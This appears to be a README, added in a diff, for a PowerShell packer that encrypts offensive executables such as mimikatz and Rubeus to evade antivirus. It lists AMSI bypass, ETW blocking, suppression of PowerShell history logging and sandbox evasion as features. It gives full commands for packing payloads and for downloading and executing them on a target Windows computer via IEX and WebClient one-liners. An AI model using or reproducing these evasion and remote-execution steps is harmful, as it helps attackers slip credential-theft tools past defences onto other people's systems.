@@ -1,0 +1,43 @@
+### Invoke-PoSH-PePacker.ps1
+--------------------------------------
+'Invoke-PoSH-PePacker' allows to pack and encrypt offensive PE files in order to bypass AV solutions such as Windows Defender.
+
+#### FEATURES
+  - AES encryption and GZip/Deflate compression (based on 'Xencrypt')
+  - Reflective PE injection (based on an updated version of 'Invoke-ReflectivePEInjection')
+  - AMSI bypass
+  - Blocking Event Tracing for Windows (ETW)
+  - Disabling PowerShell history logging
+  - Basic sandbox evasion techniques (optional)
+    - stop/exit if the PowerShell session is being debugged (detection based on "Test-Path Variable:PSDebugContext")
+    - wait for 60 seconds before execution
+  
+#### USAGE
+  - Step 1. Generate a packed & encrypted version of a PowerShell script (e.g. invoke-mimikatz.ps1, invoke-rubeus.ps1) stored locally or on a remote web server
+```
+PS C:\> Import-Module ./Invoke-PoSH-PePacker.ps1
+PS C:\> Invoke-PoSH-PePacker -FilePath C:\path\PE-file.exe -OutFile C:\path\Packed-PE-file.ps1
+--- or ---
+PS C:\> Invoke-PoSH-PePacker -FilePath C:\path\PE-file.exe -OutFile C:\path\Packed-PE-file.ps1 -sandbox
+``` 
+```
+PS C:\> Import-Module ./Invoke-PoSH-PePacker.ps1
+PS C:\> Invoke-PoSH-PePacker -FileUrl https://URL/PE-file.exe -OutFile C:\path\Packed-PE-file.ps1 
+--- or ---
+PS C:\> Invoke-PoSH-PePacker -FileUrl https://URL/PE-file.exe -OutFile C:\path\Packed-PE-file.ps1 -sandbox
+```
+  - Step 2. Download & execute the packed & encrypted PowerShell script on a target Windows computer
+```
+PS C:\> IEX (New-Object Net.WebClient).DownloadString('https://URL/Packed-PE-file.ps1'); Execute-PE
+--- or ---
+PS C:\> IEX (New-Object Net.WebClient).DownloadString('https://URL/Packed-PE-file.ps1'); Execute-PE argument1 argument2 ...
+--- or ---
+PS C:\> WGET -URI https://URL/Packed-PE-file.ps1 -OutFile C:\temp\Packed-PE-file.ps1
+PS C:\> Import-Module C:\temp\Packed-PE-file.ps1
+PS C:\> Execute-PE
+        or 
+PS C:\> Execute-PE argument1 argument2 ...
+``` 
+
+#### LICENSE
+  - GNU General Public License v3.0
